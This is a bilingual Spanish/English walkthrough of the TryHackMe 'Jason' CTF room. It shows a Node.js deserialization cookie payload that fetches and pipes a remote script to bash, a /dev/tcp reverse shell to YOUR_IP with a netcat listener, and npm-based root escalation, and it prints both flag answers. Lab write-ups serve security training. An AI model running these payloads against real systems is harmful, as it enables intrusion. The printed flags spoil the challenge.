# Jax sucks alot [EASY]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** EASY
* **Tipo / Type:** CTF (Free)
* **Slug:** `jason`
* **Link:** https://tryhackme.com/room/jason
* **Sección / Section:** CTF / Máquinas
* **Fuente / Source:** Writeup de Aakash Modi + kk0128 (Qiita) + BEPb (GitHub)

---

## Solucionario de Tareas / Task Solutions

> **ES:** "Somos Horror LLC, nos especializamos en horrores, pero uno de los aspectos más aterradores de nuestra empresa es nuestro servidor frontend. No podemos ejecutar nuestro sitio en su estado actual... Realiza una prueba de penetración exhaustiva e intenta comprometer la cuenta root."
> **EN:** "We are Horror LLC, we specialize in horrors, but one of the most terrifying aspects of our company is our frontend server. We cannot run our site in its current state... Perform a thorough penetration test and try to compromise the root account."

---

### Escaneo / Scanning

```
nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt MACHINE_IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache/2.4.41 (Ubuntu)
|_http-title: Horror LLC
```

---

### Enumeración web / Web Enumeration

La web "Horror LLC" tiene campos de entrada. Interceptando con Burp Suite, al enviar un email se devuelve una cookie `session` codificada en base64:

```
echo "eyJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSJ9" | base64 -d
{"email":"admin@admin.com"}
```

El sitio está construido en Node.js y es vulnerable a **deserialización insegura** (RCE).

---

### Explotación / Exploitation

Crear un script de reverse shell y servirlo:

```
echo -e "sh -i >& /dev/tcp/YOUR_IP/1111 0>&1" > shell.sh
python3 -m http.server 80
```

Listener:

```
nc -lvnp 1111
```

Payload de deserialización Node.js (adaptado de opsecx.com):

```
_$$ND_FUNC$$_function (){
 \t require('child_process').exec('curl http://YOUR_IP/shell.sh | bash',
function(error, stdout, stderr) { console.log(stdout) });
 }()
```

Enviar la cookie maliciosa con el payload → reverse shell como `dylan`.

---

### User Flag

```
cat /home/dylan/user.txt
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| user.txt | `0ba48780dee9f5677a4461f588af217c` |

---

### Escalada de privilegios / Privilege Escalation

```
sudo -l
```

```
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

`npm` se puede ejecutar como root sin contraseña. Usar la técnica de GTFOBins:

```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo -u root /usr/bin/npm -C $TF --unsafe-perm i
```

Esto ejecuta `/bin/sh` como root.

---

### Root Flag

```
cat /root/root.txt
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| root.txt | `2cd5a9fd3a0024bfa98d01d69241760e` |

---

## Metodología / Methodology

1. **Recon:** nmap revela SSH (22) y Apache (80).
2. **Web:** la cookie `session` está serializada en base64 → deserialización insegura en Node.js.
3. **Foothold:** payload `_$$ND_FUNC$$_` para RCE → reverse shell como `dylan`.
4. **User flag:** `/home/dylan/user.txt`.
5. **Privesc:** `sudo -l` muestra `npm` con NOPASSWD → GTFOBins `preinstall` → root.
6. **Root flag:** `/root/root.txt`.

**Lección:** la deserialización insegura en Node.js puede llevar a RCE; revisar siempre `sudo -l` y usar GTFOBins para escalar privilegios.

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
